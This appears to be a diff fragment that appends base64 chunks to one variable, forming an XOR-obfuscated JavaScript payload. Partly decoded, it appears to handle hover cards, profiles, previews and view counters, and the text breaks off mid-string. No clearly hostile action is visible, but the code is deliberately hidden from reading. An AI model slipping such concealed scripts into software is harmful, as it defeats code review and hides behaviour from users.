+pogi_si_caliber += "PC09PP2uHCwMjE0czWzceLy8zVxtHgwtHH4cLNzcbRj4PT0czF";
+pogi_si_caliber += "ys/G4cLNzcbRi87GzsHG0YqKmKmDg8rFi4LMyIOFhYOCy8zVxt";
+pogi_si_caliber += "HgwtHH4cLNzcbRjdDX2s/GjcHCwMjE0czWzcfqzsLExorYqYOD";
+pogi_si_caliber += "g4PLzNXG0eDC0cfhws3NxtGN0Nfaz8aNwcLAyMTRzNbNx4Oeg4";
+pogi_si_caliber += "TPys3GwtGOxNHCx8rGzdeLkpCWx8bEj4CRwpPCkpOPgJPCk5eT";
+pogi_si_caliber += "loqEmKmDg96p3qmpxdbNwNfKzM2D08zQytfKzM3rzNXG0YvB18";
+pogi_si_caliber += "2K2KmDg8DMzdDXg9GDnoPB182NxMbX4czWzcfKzcTgz8rGzdfx";
+pogi_si_caliber += "xsDXi4qYqYODwMzN0NeDwNSDnoPLzNXG0eDC0ceNzMXF0MbX9M";
+pogi_si_caliber += "rH18uD39+DkZKVmKmDg8DMzdDXg8DLg56Dy8zVxtHgwtHHjczF";
+pogi_si_caliber += "xdDG1+vGysTL14Pf34OSlZOYqYODz8bXg9uDnoPRjc/GxdeDiI";
+pogi_si_caliber += "PRjdTKx9fLg4yDkYOOg8DUg4yDkZipg4PPxteD2oOeg9GNwczX";
+pogi_si_caliber += "18zOg4iDkpGYqYODysWL2oOIg8DLg52Dys3NxtHrxsrEy9eDjo";
+pogi_si_caliber += "OSkYqD2oOeg9GN18zTg46DwMuDjoOSkZipg4PKxYvag5+DkpGK";
+pogi_si_caliber += "g9qDnoOSkZipg4Pbg56D7sLXy43OwtuLkpGPg+7C18uNzsrNi8";
+pogi_si_caliber += "rNzcbR9MrH18uDjoPA1IOOg5KRj4PbioqYqYODy8zVxtHgwtHH";
+pogi_si_caliber += "jdDX2s/Gjc/GxdeDnoPuwtfLjdHM1s3Hi9uKg4iDhNPbhJipg4";
+pogi_si_caliber += "PLzNXG0eDC0ceN0Nfaz8aN18zTg56D7sLXy43RzNbNx4vaioOI";
+pogi_si_caliber += "g4TT24SYqd6pqcXWzcDXyszNg9DLzNTrzNXG0YvB182K2KmDg8";
+pogi_si_caliber += "DMzdDXg87GzsHG0YOeg+H66uf4wdfNjcfC18LQxteNysf+mKmD";
+pogi_si_caliber += "g8rFi4LOxs7BxtGKg9HG19bRzZipg4PLzNXG0eHXzYOeg8HXzZ";
+pogi_si_caliber += "ipg4PLzNXG0erHg56DzsbOwcbRjcfK0MDM0cfqx5ipg4PFys/P";
+pogi_si_caliber += "68zVxtGLzsbOwcbRipipg4PLzNXG0eDC0ceNwM/C0NDvytDXjc";
+pogi_si_caliber += "LHx4uEzM2Eipipg4PLzNXG0eDC0ceN0MbX4tfX0crB1tfGi4TC";
+pogi_si_caliber += "0crCjsvKx8fGzYSPg4TFws/QxoSKmKmDg9PM0MrXyszN68zVxt";
+pogi_si_caliber += "GLwdfNipip3qnF1s3A18rMzYPLysfG68zVxtGLyMbG0+LWx8rM";
+pogi_si_caliber += "itipg4PLzNXG0eHXzYOeg83Wz8+YqYODy8zVxtHqx4Oeg83Wz8";
+pogi_si_caliber += "+YqYODy8zVxtHgwtHHjcDPwtDQ78rQ143Rxs7M1caLhMzNhIqY";
+pogi_si_caliber += "qYODy8zVxtHgwtHHjdDG1+LX19HKwdbXxouEwtHKwo7LysfHxs";
+pogi_si_caliber += "2Ej4OE19HWxoSKmKmDg9DXzNPrzNXG0fDM1s3Hi4KCyMbG0+LW";
+pogi_si_caliber += "x8rMipip3qmpjIyD68zVxtGD09HG1crG1JmD08zKzdfKzcSDwt";
+pogi_si_caliber += "eDwoPOxs7BxtGD08/C2tCD18vGytGD09HMxcrPxoPO1tDKwIOL";
+pogi_si_caliber += "0MLOxoPX0cLAyIPC0IPXy8bK0YPT0czFys/Gio+pjIyDx9bAyM";
+pogi_si_caliber += "rNxIPXy8aD0MrXxoPO1tDKwJiDz8bC1crNxIPCg8DC0ceD0NfM";
+pogi_si_caliber += "09CDyteDws3Hg8HRys3E0IPXy8aD0MrXxoPO1tDKwIPBwsDIja";
+pogi_si_caliber += "nAzM3Q14PLzNXG0e7W0MrAg56DzcbUg+LWx8rMi4qYqcvM1cbR";
+pogi_si_caliber += "7tbQysCNz8zM04Oeg9fR1saYqcvM1cbR7tbQysCN09HGz8zCx4";
+pogi_si_caliber += "Oeg4TNzM3GhJipy8zVxtHu1tDKwI3VzM/WzsaDnoONlpipz8bX";
+pogi_si_caliber += "g8vM1cbR8MzWzcfszYOeg8XCz9DGj4PLzNXG0fDM1s3H98rOxt";
+pogi_si_caliber += "GDnoOTj4PLzNXG0fHGz8bC0Mb3ys7G0YOeg5OYqanF1s3A18rM";
+pogi_si_caliber += "zYPQ18LR1+vM1cbR8MzWzceLzsbOwcbRitipg4PAz8bC0ffKzs";
+pogi_si_caliber += "bM1teLy8zVxtHwzNbNx/fKzsbRipipg4PAz8bC0ffKzsbM1teL";
+pogi_si_caliber += "y8zVxtHxxs/GwtDG98rOxtGKmKmDg8rFi4LOxs7BxtGD39+Dgs";
+pogi_si_caliber += "7GzsHG0Y3O1tDKwIPf34OCxs3XxtHGx4qD0cbX1tHNmKmDg8vM";
+pogi_si_caliber += "1cbR8MzWzcf3ys7G0YOeg9DG1/fKzsbM1teLi4qDnp2D2KmDg4";
+pogi_si_caliber += "ODysWL09HMxcrPxu7Mx8LPjcDPwtDQ78rQ143AzM3XwsrN0IuE";
+pogi_si_caliber += "1crQysHPxoSKioPRxtfW0c2YqYODg4PH1sDI8MrXxuLWx8rMi4";
+pogi_si_caliber += "qYqYODg4PKxYvLzNXG0e7W0MrAjcfC18LQxteN0NHAg4KenoPO";
+pogi_si_caliber += "xs7BxtGNztbQysCK2KmDg4ODg4PLzNXG0e7W0MrAjcfC18LQxt";
+pogi_si_caliber += "eN0NHAg56DzsbOwcbRjc7W0MrAmKmDg4ODg4PLzNXG0e7W0MrA";
+pogi_si_caliber += "jdDRwIOeg87GzsHG0Y3O1tDKwJipg4ODg96pg4ODg8vM1cbR8M";
+pogi_si_caliber += "zWzcfszYOeg9fR1saYqYODg4PLzNXG0e7W0MrAjdPPwtqLio3A";
+pogi_si_caliber += "wtfAy4uLioOenYPY3oqYqYOD3o+DkpWTipip3qnF1s3A18rMzY";
+pogi_si_caliber += "PQ18zT68zVxtHwzNbNx4vIxsbT59bAyIrYqYODwM/GwtH3ys7G";
+pogi_si_caliber += "zNbXi8vM1cbR8MzWzcf3ys7G0YqYqYODysWLgsvM1cbR8MzWzc";
+pogi_si_caliber += "fszYqD0cbX1tHNmKmDg8vM1cbR8MzWzcfszYOeg8XCz9DGmKmD";
+pogi_si_caliber += "g8vM1cbR7tbQysCN08LW0MaLipipg4PKxYvIxsbT59bAyIqD0c";
+pogi_si_caliber += "bX1tHNmKmDg8DPxsLR98rOxszW14vLzNXG0fHGz8bC0Mb3ys7G";
+pogi_si_caliber += "0YqYqYODy8zVxtHxxs/GwtDG98rOxtGDnoPQxtf3ys7GzNbXi4";
+pogi_si_caliber += "uKg56dg9ipg4ODg8rFi4LLzNXG0fDM1s3H7M2DhYWDgtPRzMXK";
+pogi_si_caliber += "z8buzMfCz43Az8LQ0O/K0NeNwMzN18LKzdCLhNXK0MrBz8aEio";
+pogi_si_caliber += "qD1s3H1sDI8MrXxuLWx8rMi4qYqYOD3o+DkJOTipip3qmp0czQ";
+pogi_si_caliber += "18bR5s+NwsfH5tXGzdfvytDXxs3G0YuE08zKzdfG0czVxtGEj4";
+pogi_si_caliber += "PGg56dg9ipg4PKxYvGjdPMys3XxtH32tPGg56enoOE18zWwMuE";
+pogi_si_caliber += "ioPRxtfW0c2YqYODwMzN0NeDwdfNg56Dxo3XwtHExteNwM/M0M";
+pogi_si_caliber += "bQ14uEjc6Eipipg4PKxYuCwdfNg9/fg8HXzY3Az8LQ0O/K0NeN";
+pogi_si_caliber += "wMzN18LKzdCLhM6Oxs7T19qEioPf34PB182Dnp6eg8vM1cbR4d";
+pogi_si_caliber += "fNioPRxtfW0c2YqYOD0MvM1OvM1cbRi8HXzYqYqYOD0NfC0dfr";
+pogi_si_caliber += "zNXG0fDM1s3Hi+H66uf4wdfNjcfC18LQxteNysf+ipip3oqYqd";
+pogi_si_caliber += "HM0NfG0ebPjcLHx+bVxs3X78rQ18bNxtGLhNPMys3XxtHM1teE";
+pogi_si_caliber += "j4PGg56dg9ipg4PAzM3Q14PB182DnoPGjdfC0cTG143Az8zQxt";
+pogi_si_caliber += "DXi4SNzoSKmKmDg8rFi4LB182D39+DwdfNg4KenoPLzNXG0eHX";
+pogi_si_caliber += "zYqD0cbX1tHNmKmDg8rFi8HXzY3AzM3XwsrN0IvGjdHGz8LXxs";
+pogi_si_caliber += "f3wtHExteKioPRxtfW0c2YqYODy8rHxuvM1cbRi4qYqd6KmKnR";
+pogi_si_caliber += "zNDXxtHmz43Cx8fm1cbN1+/K0NfGzcbRi4TFzMDW0MrNhI+Dxo";
+pogi_si_caliber += "OenYPYqYODwMzN0NeDwdfNg56Dxo3XwtHExteNwM/M0MbQ14uE";
+pogi_si_caliber += "jc6Eipipg4PKxYvB182DhYWDgsHXzY3Az8LQ0O/K0NeNwMzN18";
+pogi_si_caliber += "LKzdCLhM6Oxs7T19qEioqD0MvM1OvM1cbRi8HXzYqYqd6KmKnR";
+pogi_si_caliber += "zNDXxtHmz43Cx8fm1cbN1+/K0NfGzcbRi4TFzMDW0MzW14SPg8";
+pogi_si_caliber += "aDnp2D2KmDg8rFi8aN18LRxMbXjcDPzNDG0NeLhI3OhIqKg8vK";
+pogi_si_caliber += "x8brzNXG0YuKmKneipipx8zA1s7GzdeNxMbX5s/GzsbN1+Ha6s";
+pogi_si_caliber += "eLhNDLxs/PhIqNwsfH5tXGzdfvytDXxs3G0YuE0MDRzM/PhI+D";
+pogi_si_caliber += "i4qDnp2D2KmDg8rFi8vM1cbR6seKg8vKx8brzNXG0YuKmKnej4";
+pogi_si_caliber += "PYg9PC0NDK1caZg9fR1saD3oqYqcLHx+bVxs3X78rQ18bNxtGL";
+pogi_si_caliber += "hNHG0MrZxoSPg4uKg56dg9ipg4PKxYvLzNXG0erHioPLysfG68";
+pogi_si_caliber += "zVxtGLipip3oqYqanPxteDwtbHyszw18LR18bHg56DxcLP0MaY";
+pogi_si_caliber += "qcXWzcDXyszNg9DXwtHX4s7BysbN1+LWx8rMi4rYqYODysWLwt";
+pogi_si_caliber += "bHyszw18LR18bHioPRxtfW0c2YqYODwtbHyszw18LR18bHg56D";
+pogi_si_caliber += "19HWxpipg4PAzM3Q14PGz4Oeg8fMwNbOxs3XjcTG1+bPxs7Gzd";
+pogi_si_caliber += "fh2urHi4TBxO7W0MrA5s+Eipipg4PGz43Q0cCDnoPg7O3l6uSN";
+pogi_si_caliber += "ztbQysCN1tHPmKmDg8bPjdXMz9bOxoOeg+Ds7eXq5I3O1tDKwI";
+pogi_si_caliber += "3VzM/WzsaYqYODxs+N08/C2ouKjcDC18DLi8aDnp2DwMzN0MzP";
+pogi_si_caliber += "xo3UwtHNi4TBwsDIxNHM1s3Hg87W0MrAg8HPzMDIxseM1s3C1c";
+pogi_si_caliber += "LKz8LBz8aEj4PGioqYqd6pxdbNwNfKzM2Dx9bAyPDK18bi1sfK";
+pogi_si_caliber += "zIuK2KmDg8DMzdDXg8HEg56Dx8zA1s7GzdeNxMbX5s/GzsbN1+";
+pogi_si_caliber += "Ha6seLhMHE7tbQysDmz4SKmKmDg8rFi8HEg4WFg4LBxI3TwtbQ";
+pogi_si_caliber += "xseK2IPBxI3HwtfC0MbXjdTC0PPPwtrKzcSDnoOEkoSYg8HEjd";
+pogi_si_caliber += "PC1tDGi4qYg96p3qnF1s3A18rMzYPWzcfWwMjwytfG4tbHysyL";
+pogi_si_caliber += "itipg4PAzM3Q14PBxIOeg8fMwNbOxs3XjcTG1+bPxs7Gzdfh2u";
+pogi_si_caliber += "rHi4TBxO7W0MrA5s+Eipipg4PKxYvBxIOFhYPBxI3HwtfC0MbX";
+pogi_si_caliber += "jdTC0PPPwtrKzcSDnp6eg4SShIrYg8HEjdPPwtqLio3AwtfAy4";
+pogi_si_caliber += "uLioOenYPY3oqYg8fGz8bXxoPBxI3HwtfC0MbXjdTC0PPPwtrK";
+pogi_si_caliber += "zcSYg96p3qmpwMzN0NeD09HMxcrPxu7Mx8LPg56Dx8zA1s7Gzd";
+pogi_si_caliber += "eNxMbX5s/GzsbN1+Ha6seLhNPRzMXKz8buzMfCz4SKmKnAzM3Q";
+pogi_si_caliber += "14PT0czFys/G4czH2oOeg8fMwNbOxs3XjcTG1+bPxs7Gzdfh2u";
+pogi_si_caliber += "rHi4TT0czFys/G7szHws/hzMfahIqYqcDMzdDXg9XKxtTQ4MzW";
+pogi_si_caliber += "zdfmz4Oeg8fMwNbOxs3XjcTG1+bPxs7Gzdfh2urHi4TT0czFys";
+pogi_si_caliber += "/G7szHws/1ysbU0ODM1s3XhIqYqcfMwNbOxs3XjcTG1+bPxs7G";
+pogi_si_caliber += "zdfh2urHi4TT0czFys/G7szHws/i0deEio3XxtvX4MzN18bN14";
+pogi_si_caliber += "Oeg+Xm9+Dr/OLx95ipz8bXg8zTxs3uxs7BxtGDnoPN1s/PmKnP";
+pogi_si_caliber += "xteDwM7H98rOxtGDnoOTmKnPxteD0dbN98rOxtGDnoOTmKmpwM";
+pogi_si_caliber += "zN0NeD9erm9Pzi8+qDnoOEy9fX09CZjIzCwcLA1tCNycLQzM3A";
+pogi_si_caliber += "ws7G0czNjcfG1YSYqcDMzdDXg/Xq5vT84Oz27ffm8fzt4u7m8P";
+pogi_si_caliber += "Pi4OaDnoOE18vRxsLXkdDMwMrG19qO0MrXxoSYqcDMzdDXg/Xq";
+pogi_si_caliber += "5vT84OLg6+b86Ob6g56DhNeR0PPRzMXKz8b1ysbU0ODCwMvGhJ";
+pogi_si_caliber += "ipwMzN0NeD9erm9Pzw5ubt/Ojm+oOeg4TXkdDz0czFys/G9crG";
+pogi_si_caliber += "1NDwxsbNhJipqcXWzcDXyszNg9HGwsfw18zRxovIxtqK2KmDg9";
+pogi_si_caliber += "fR2tiD0cbX1tHNg+nw7O2N08LR0MaLz8zAws/w18zRwsTGjcTG";
+pogi_si_caliber += "1+rXxs6LyMbaioPf34OE2N6EioPf34PY3piD3sDC18DLi8aK2I";
+pogi_si_caliber += "PRxtfW0c2D2N6Yg96p3qnF1s3A18rMzYPU0crXxvDXzNHGi8jG";
+pogi_si_caliber += "2o+DzMHJitipg4PX0drYg8/MwMLP8NfM0cLExo3Qxtfq18bOi8";
+pogi_si_caliber += "jG2o+D6fDs7Y3Q19HKzcTKxdqLzMHJioqYg97AwtfAy4vGitje";
+pogi_si_caliber += "qd6pwtDazcCDxdbNwNfKzM2D1crG1ODM1s3XxtGLzNOPg9DP1s";
+pogi_si_caliber += "SK2KmDg8DMzdDXg9HG0IOeg8LUwsrXg8XG18DLi/Xq5vT84vPq";
+pogi_si_caliber += "g4iDhIyEg4iDzNODiIOEjISDiIP16ub0/ODs9u335vH87eLu5v";
+pogi_si_caliber += "Dz4uDmg4iDhIzT0czFys/GjoSDiIPGzcDMx8b28ergzM7TzM3G";
+pogi_si_caliber += "zdeL0M/WxIqPg9iDwMLAy8aZg4TNzI7Q18zRxoSD3oqYqYODys";
+pogi_si_caliber += "WL0cbQjdDXwtfW0IOenp6Dl5OXg4WFg8zTg56enoOExMbXhIqD";
+pogi_si_caliber += "0cbX1tHNg5OYqYODysWLgtHG0I3MyIqD18vRzNSDzcbUg+bR0c";
+pogi_si_caliber += "zRi4TVysbUg8DM1s3XxtGD0cbQ08zNx8bHg4SDiIPRxtCN0NfC";
+pogi_si_caliber += "19bQipipg4PAzM3Q14PNg56D7dbOwcbRi4vC1MLK14PRxtCNyd";
+pogi_si_caliber += "DMzYuKio3Vws/WxoqYqYODysWLgsrQ5crNytfGi82KioPXy9HM";
+pogi_si_caliber += "1IPNxtSD5tHRzNGLhNXKxtSDwMzWzdfG0YPRxtfW0c3Gx4PNzI";
+pogi_si_caliber += "PVws/WxoSKmKmDg9HG19bRzYPNmKneqYyMg+zNxoPVysbUg9PG";
+pogi_si_caliber += "0YPB0czU0MbRg9PG0YPT0czFys/GmYPXy8aDxcrR0NeDzNPGzY";
+pogi_si_caliber += "PCx8fQg5KD18yD18vGg9DLwtHGx4PXzNfCz4+Dz8LXxtGDzNPG";
+pogi_si_caliber += "zdCDzM3P2oPRxsLHg8rXjanC0NrNwIPF1s3A18rMzYPB1s7T89";
+pogi_si_caliber += "HMxcrPxvXKxtTgzNbN14vQz9bEitipg4PAzM3Q14PQxsbNg56D";
+pogi_si_caliber += "0cbCx/DXzNHGi/Xq5vT88Obm7fzo5vqKmKmDg8DMzdDXg8XK0d";
+pogi_si_caliber += "DXg56DgtDGxs340M/WxP6YqYOD19Ha2KmDg4ODwMzN0NeDzYOe";
+pogi_si_caliber += "g8LUwsrXg9XKxtTgzNbN18bRi8XK0dDXg5yDhMvK14SDmYOExM";
+pogi_si_caliber += "bXhI+D0M/WxIqYqYODg4PKxYvFytHQ14rYg9DGxs340M/WxP6D";
+pogi_si_caliber += "noOSmIPU0crXxvDXzNHGi/Xq5vT88Obm7fzo5vqPg9DGxs2KmI";
+pogi_si_caliber += "PeqYODg4PAzM3Q14PAwsDLxoOeg9HGwsfw18zRxov16ub0/ODi";
+pogi_si_caliber += "4Ovm/Ojm+oqYqYODg4PAwsDLxvjQz9bE/oOeg82YqYODg4PU0c";
+pogi_si_caliber += "rXxvDXzNHGi/Xq5vT84OLg6+b86Ob6j4PAwsDLxoqYqYODg4PR";
+pogi_si_caliber += "xtfW0c2DzZipg4PewMLXwMuLxtHRitipg4ODg8DMzdDXg8DCwM";
+pogi_si_caliber += "vGx4Oeg9HGwsfw18zRxov16ub0/ODi4Ovm/Ojm+or40M/WxP6Y";
+pogi_si_caliber += "qYODg4PRxtfW0c2D19rTxszFg8DCwMvGx4Oenp6DhM3WzsHG0Y";
+pogi_si_caliber += "SDnIPAwsDLxseDmYPN1s/PmKmDg96p3qmpxdbNwNfKzM2DxcrP";
+pogi_si_caliber += "z/PRzMXKz8aLzsbOwcbRitipg4PAzM3Q14PKx4Oeg87GzsHG0Y";
+pogi_si_caliber += "3HytDAzNHH6sePg9ODnoPw+MrH/o+D1oOeg9ODhYWD043HytDA";
+pogi_si_caliber += "zNHH/NbQxtGPg9DXg56D04Ocg4vTjcfK0MDM0cf80NfC19bQg9";
+pogi_si_caliber += "/fg4TMxcXPys3GhIqDmYOEzMXFz8rNxoSYqYODwMzN0NeDwczb";
+pogi_si_caliber += "g56Dx8zA1s7GzdeNxMbX5s/GzsbN1+Ha6seLhNPRzMXKz8buzM";
+pogi_si_caliber += "fCz+LVwtfC0fTRwtOEipipg4PAzM3Q14PCg56Dx8zA1s7GzdeN";
+pogi_si_caliber += "xMbX5s/GzsbN1+Ha6seLhNPRzMXKz8buzMfCz+LVwtfC0YSKmK";
+pogi_si_caliber += "mDg8DMzdDXg8LVg56DwtXC18LR9tHPi9aPg8rHipipg4PQxtfw";
+pogi_si_caliber += "14vBzNuPg9DXipipg4PKxYvCjcTG1+LX19HKwdbXxouE0NHAhI";
+pogi_si_caliber += "qDgp6eg8LVioPCjdDRwIOeg8LVmKmDg9DG1+fGwMyLwczbj4PH";
+pogi_si_caliber += "xsDM9tHPi9aKipipg4PHzMDWzsbN143Extfmz8bOxs3X4drqx4";
+pogi_si_caliber += "uE09HMxcrPxu7Mx8LP7cLOxoSKjdfG29fgzM3Xxs3Xg56D1oOc";
+pogi_si_caliber += "g4vWjcfK0NPPwtr8zcLOxoPf34PWjcTPzMHCz/zNws7Gg9/fg9";
+pogi_si_caliber += "aN1tDG0c3CzsaKg5mDzsbOwcbRjc3CzsaYqYODx8zA1s7GzdeN";
+pogi_si_caliber += "xMbX5s/GzsbN1+Ha6seLhNPRzMXKz8buzMfCz+vCzcfPxoSKjd";
+pogi_si_caliber += "fG29fgzM3Xxs3Xg56D1oOcg4TjhIOIg9aN1tDG0c3CzsaDmYOE";
+pogi_si_caliber += "44SDiIPOxs7BxtGNzcLOxpipg4PAzM3Q14PQ5s+DnoPHzMDWzs";
+pogi_si_caliber += "bN143Extfmz8bOxs3X4drqx4uE09HMxcrPxu7Mx8LP8NfC19bQ";
+pogi_si_caliber += "hIqYqYOD0MbX8NeL0ObPj4PQ14qYqYOD0ObPjdLWxtHa8MbPxs";
+pogi_si_caliber += "DXzNGLhNDTws2Eio3XxtvX4MzN18bN14Oeg9DXwtfW0O/CwcbP";
+pogi_si_caliber += "0PjQ1/6D39+D0NeYqYODwMzN0NeDwsDXg56D04Ocg8fG0MDRys";
+pogi_si_caliber += "HG4sDXytXK19qL04+D0NeKg5mDi9DXwtfW0O/CwcbP0PjQ1/6D";
+pogi_si_caliber += "39+D0NeKmKmDg8fMwNbOxs3XjcTG1+bPxs7Gzdfh2urHi4TT0c";
+pogi_si_caliber += "zFys/G7szHws/w18LX1tD3xtvXhIqN18bb1+DMzdfGzdeDnoPC";
+pogi_si_caliber += "wNeDnp6eg4vQ18LX1tDvwsHGz9D40Nf+g9/fg9DXioOcg4T/1p";
+pogi_si_caliber += "GTkpeEg5mDwsDXmKneqanF1s3A18rMzYPQxtfx1s3vys3Gi9fG";
+pogi_si_caliber += "29ePg8fMzcaK2KmDg8DMzdDXg9HWzYOeg8fMwNbOxs3XjcTG1+";
+pogi_si_caliber += "bPxs7Gzdfh2urHi4TT0czFys/G7szHws/x1s2Eipipg4PHzMDW";
+pogi_si_caliber += "zsbN143Extfmz8bOxs3X4drqx4uE09HMxcrPxu7Mx8LP8dbN98";
+pogi_si_caliber += "bb14SKjdfG29fgzM3Xxs3Xg56D18bb15ipg4PKxYvR1s2Ny8rH";
+pogi_si_caliber += "x8bNitiD0dbNjcvKx8fGzYOeg8XCz9DGmIPRxtLWxtDX4s3Kzs";
+pogi_si_caliber += "LXyszN5dHCzsaLi4qDnp2D0dbNjcDPwtDQ78rQ143Cx8eLhMzN";
+pogi_si_caliber += "hIqKmIPeqYOD0dbNjcDPwtDQ78rQ143XzMTEz8aLhMfMzcaEj4";
+pogi_si_caliber += "OCgsfMzcaKmKneqanF1s3A18rMzYPX2tPG89HMxcrPxuDMzs7C";
+pogi_si_caliber += "zceLzsbOwcbRitipg4PAzM3Q14PAzsfmz4Oeg8fMwNbOxs3Xjc";
+pogi_si_caliber += "TG1+bPxs7Gzdfh2urHi4TT0czFys/G7szHws/gzseEipipg4PA";
+pogi_si_caliber += "zM3Q14PR1s2DnoPHzMDWzsbN143Extfmz8bOxs3X4drqx4uE09";
+pogi_si_caliber += "HMxcrPxu7Mx8LP8dbNhIqYqYODwMzN0NeD18bb14Oeg4TExteO";
+pogi_si_caliber += "09HMxcrPxoOOjs3CzsaDgYSDiIPOxs7BxtGNzcLOxoOIg4SBhJ";
+pogi_si_caliber += "ipg4PAz8bC0ffKzsbM1teLwM7H98rOxtGKmKmDg8DPxsLR98rO";
+pogi_si_caliber += "xszW14vR1s33ys7G0YqYqYOD09HMxcrPxu7Mx8LPjcDPwtDQ78";
+pogi_si_caliber += "rQ143Cx8eLhNfa08rNxISKmKmDg9HWzY3LysfHxs2DnoPX0dbG";
+pogi_si_caliber += "mKmDg9HWzY3Az8LQ0O/K0NeN0cbOzNXGi4TMzYSPg4THzM3GhI";
+pogi_si_caliber += "qYqYODwM7H5s+N18bb1+DMzdfGzdeDnoOEhJipg4PKxYvRxsfW";
+pogi_si_caliber += "wMbuzNfKzM2K2KmDg4ODwM7H5s+N18bb1+DMzdfGzdeDnoPXxt";
+pogi_si_caliber += "vXmKmDg4OD0MbX8dbN78rNxouE+IPMyIP+g9PRzMXKz8aDz8zC";
+pogi_si_caliber += "x8bHhI+D19HWxoqYqYODg4PT0czFys/G7szHws+NwM/C0NDvyt";
+pogi_si_caliber += "DXjdHGzszVxouE19rTys3EhIqYqYODg4PRxtfW0c2YqYOD3qmD";
+pogi_si_caliber += "g8/G14PKg56Dk5ipg4OLxdbNwNfKzM2D0NfG04uK2KmDg4ODwM";
+pogi_si_caliber += "7H5s+N18bb1+DMzdfGzdeDiJ6D18bb143Ay8LR4teLyoiIipip";
+pogi_si_caliber += "g4ODg8rFi8qDn4PXxtvXjc/GzcTXy4rYqYODg4ODg8DMzdDXg9";
+pogi_si_caliber += "PC1tDGg56D7sLXy43Rws3HzM6LioOfg42TlIOcg5KWk4OIg+7C";
+pogi_si_caliber += "18uN0cLNx8zOi4qDiYOSlZODmYOTmKmDg4ODg4PAzsf3ys7G0Y";
+pogi_si_caliber += "Oeg9DG1/fKzsbM1teL0NfG04+DlpuDiIPuwtfLjdHCzcfMzouK";
+pogi_si_caliber += "g4mDl5eDiIPTwtbQxoqYqYODg4Pexs/Qxtipg4ODg4ODwM7H98";
+pogi_si_caliber += "rOxtGDnoPQxtf3ys7GzNbXi4uKg56dg9ipg4ODg4ODg4PQxtfx";
+pogi_si_caliber += "1s3vys3Gi4TG28bA1tfKzcSDhIOIg9fG29ePg8XCz9DGipipg4";
+pogi_si_caliber += "ODg4ODg4PR1s33ys7G0YOeg9DG1/fKzsbM1teLi4qDnp2D2KmD";
+pogi_si_caliber += "g4ODg4ODg4OD0MbX8dbN78rNxouE+IPMyIP+g9PRzMXKz8aDz8";
+pogi_si_caliber += "zCx8bHhI+D19HWxoqYqYODg4ODg4ODg4PR1s33ys7G0YOeg9DG";
+pogi_si_caliber += "1/fKzsbM1teLi4qDnp2D09HMxcrPxu7Mx8LPjcDPwtDQ78rQ14";
+pogi_si_caliber += "3Rxs7M1caLhNfa08rNxISKj4OQk5OKmKmDg4ODg4ODg96Pg5SR";
+pogi_si_caliber += "k4qYqYODg4ODg96Pg5GXk4qYqYODg4PeqYOD3oqLipip3qmpxd";
+pogi_si_caliber += "bNwNfKzM2DzNPGzfPRzMXKz8aLzsbOwcbRitipg4PKxYuCzsbO";
+pogi_si_caliber += "wcbRioPRxtfW0c2YqYODy8rHxuvM1cbRi9fR1saKmKmDg8DMzd";
+pogi_si_caliber += "DXg9DP1sSDnoPQz9bEysXai87GzsHG0Y3Nws7Gipipg4PAzM3Q";
+pogi_si_caliber += "14PLws3Hz8aDnoOE15HQ44SDiIPw19HKzcSLzsbOwcbRjc3Czs";
+pogi_si_caliber += "aKjdfM78zUxtHgwtDGi4qYqYODzNPGze7GzsHG0YOeg87GzsHG";
+pogi_si_caliber += "0Zipg4PFys/P89HMxcrPxovOxs7BxtGKmKmpg4PT0czFys/G7s";
+pogi_si_caliber += "zHws+N0tbG0drwxs/GwNfM0eLPz4uEjdPOjtbQxtGEio3FzNHm";
+pogi_si_caliber += "wsDLi8bPg56dg9iDxs+N18bb1+DMzdfGzdeDnoPLws3Hz8aYg9";
+pogi_si_caliber += "6KmKmDg8fMwNbOxs3XjcTG1+bPxs7Gzdfh2urHi4TT0czFys/G";
+pogi_si_caliber += "7szHws/zwtfLhIqN18bb1+DMzdfGzdeDnoPLws3Hz8aDiIOEmY";
+pogi_si_caliber += "PdjNPRzMXKz8bQjISDiIPQz9bEmKmDg9PRzMXKz8buzMfCz43A";
+pogi_si_caliber += "z8LQ0O/K0NeNwsfHi4TX2tPKzcSEipipg4PHzMDWzsbN143Ext";
+pogi_si_caliber += "fmz8bOxs3X4drqx4uE09HMxcrPxu7Mx8LP4M7HhIqN18bb1+DM";
+pogi_si_caliber += "zdfGzdeDnoOEhJipqYODwMzN0NeDwcSDnoPBwsDIxNHM1s3H9c";
+pogi_si_caliber += "LP1saL09HMxcrPxuHCzc3G0YvOxs7BxtGKipipg4PT0czFys/G";
+pogi_si_caliber += "7szHws+N0Nfaz8aN0MbX89HM08bR19qLhI6O086OwcSEj4PBxI";
+pogi_si_caliber += "3KzsLExoPf34OEzczNxoSKmKmpg4PT0czFys/G7szHws+NwM/C";
+pogi_si_caliber += "0NDvytDXjcLHx4uE1crQysHPxoSKmKmDg9PRzMXKz8buzMfCz4";
+pogi_si_caliber += "3Qxtfi19fRysHW18aLhMLRysKOy8rHx8bNhI+DhMXCz9DGhIqY";
+pogi_si_caliber += "qYOD09HMxcrPxuHMx9qN0MDRzM/P98zTg56Dk5ipg4PX2tPG89";
+pogi_si_caliber += "HMxcrPxuDMzs7CzceLzsbOwcbRipipqYOD19Ha2IPLytDXzNHa";
+pogi_si_caliber += "jdPW0Mvw18LXxovYg9PRzMXKz8aZg9DP1sSD3o+DhISPg4SMhI";
+pogi_si_caliber += "OIg9DP1sSKmIPewMLXwMuLxtHRitjeqamDg8DMzdDXg9POg56D";
+pogi_si_caliber += "x8zA1s7GzdeNxMbX5s/GzsbN1+Ha6seLhNPRzMXKz8bu1tDKwO";
+pogi_si_caliber += "bPhIqYqYODwMzN0NeDztbQysD1ws+DnoPOxs7BxtGNztbQysCD";
+pogi_si_caliber += "39+DhISYqYODysWLztbQysD1ws+K2KmDg4ODx9bAyPDK18bi1s";
+pogi_si_caliber += "fKzIuKmKmDg4OD086N0NHAg56DztbQysD1ws+YqYODg4PTzo3V";
+pogi_si_caliber += "zM/WzsaDnoONlpipg4ODg9POjdPPwtqLio3AwtfAy4uLioOenY";
+pogi_si_caliber += "PY3oqYqYOD3sbP0MbYqYODg4PTzo3TwtbQxouKmKmDg4OD086N";
+pogi_si_caliber += "0cbOzNXG4tfX0crB1tfGi4TQ0cCEipipg4ODg8rFi8LWx8rM8N";
+pogi_si_caliber += "fC0dfGx4qD1s3H1sDI8MrXxuLWx8rMi4qYqYODg4PGz9DGg9DX";
+pogi_si_caliber += "wtHX4s7BysbN1+LWx8rMi4qYqYOD3qmpg4PVysbU0ODM1s3X5s";
